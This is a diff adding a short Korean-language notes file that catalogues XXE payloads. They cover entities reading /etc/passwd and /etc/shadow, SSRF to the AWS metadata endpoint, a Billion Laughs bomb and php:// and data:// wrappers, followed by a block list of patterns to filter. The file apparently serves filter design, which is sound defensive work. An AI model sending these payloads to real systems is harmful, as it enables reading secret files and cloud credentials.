@@ -1,0 +1,31 @@
+XXE 공격 패턴 분석:
+
+1. 로컬 파일 포함 공격 (Local File Inclusion):
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]>
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/version'>]>
+
+2. SSRF 공격 (Server-Side Request Forgery):
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]>
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://localhost:22'>]>
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://internal-server/'>]>
+
+3. Billion Laughs 공격 (XML Bomb):
+   - <!DOCTYPE test [<!ENTITY lol0 "lol"><!ENTITY lol1 "&lol0;&lol0;">]>
+   - 중첩된 엔티티 확장으로 메모리 고갈
+
+4. 기타 XXE 패턴:
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>]>
+   - <!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>]>
+
+차단해야 할 패턴:
+- DOCTYPE 선언
+- ENTITY 선언
+- SYSTEM 키워드
+- PUBLIC 키워드
+- file:// 프로토콜
+- http://169.254.169.254 (AWS 메타데이터)
+- data:// 프로토콜
+- php:// 프로토콜
+- & 엔티티 참조
+- % 엔티티 참조
